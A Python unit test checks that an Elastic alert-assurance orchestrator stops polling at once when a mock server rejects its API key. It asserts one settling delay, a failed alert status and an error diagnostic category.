def test_orchestrator_alert_settling_aborts_on_auth_failure():
    """Verify that alert settling aborts immediately on HTTP 401/403 and does not spin retries."""
    store = InMemoryStore()
    setup_test_context(store, run_id="RUN-AUTH-FAIL-01", execution_token="tok-auth-01")

    with run_mock_elastic_server(api_key="valid-secret-key") as mock:
        bad_settings = mock.get_settings()
        bad_settings.api_key = "wrong-key"
        bad_client = ElasticAlertClient(settings=bad_settings)

        slept_intervals = []
        def mock_sleep(seconds: float):
            slept_intervals.append(seconds)

        settings = ElasticOrchestratorSettings(
            alert_settling_delay_seconds=2.0,
            alert_settling_poll_interval_seconds=1.0,
            alert_settling_max_polls=5,
        )

        orchestrator = ElasticAssuranceOrchestrator(
            client=bad_client,
            store=store,
            settings=settings,
            sleep_fn=mock_sleep,
        )

        result, report = orchestrator.evaluate_run_with_orchestration(
            run_id="RUN-AUTH-FAIL-01",
            fetch_telemetry=False,
            fetch_alerts=True,
        )

        # Aborted on first poll after initial delay, did not sleep 4 times for polling intervals!
        assert slept_intervals == [2.0]
        assert report.alerts_status == "FAILED"
        assert report.is_complete is False
        assert result.predicted_category == DiagnosticCategory.ERROR

